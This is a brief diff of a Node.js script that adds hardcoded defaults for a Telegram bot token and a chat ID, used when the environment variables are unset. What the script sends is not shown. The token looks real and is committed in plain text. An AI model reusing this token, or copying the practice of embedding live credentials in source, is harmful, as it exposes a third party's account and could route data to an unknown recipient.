@@ -2,11 +2,14 @@ const fs = require("fs");
 const path = require("path");
 const axios = require("axios");
 
-const TELEGRAM_BOT_TOKEN = String(process.env.KL_TELEGRAM_BOT_TOKEN || "").trim();
+const TELEGRAM_BOT_TOKEN = String(
+  process.env.KL_TELEGRAM_BOT_TOKEN
+  || "8160454540:AAFNw45RFKPJf2_QzMXsoHcBa8h-RVRRwvk"
+).trim();
 const TELEGRAM_CHAT_IDS = String(
   process.env.KL_TELEGRAM_CHAT_IDS
   || process.env.KL_TELEGRAM_CHAT_ID
-  || ""
+  || "5583690035"
 )
   .split(/[,\s;]+/)
   .map((value) => String(value || "").trim())
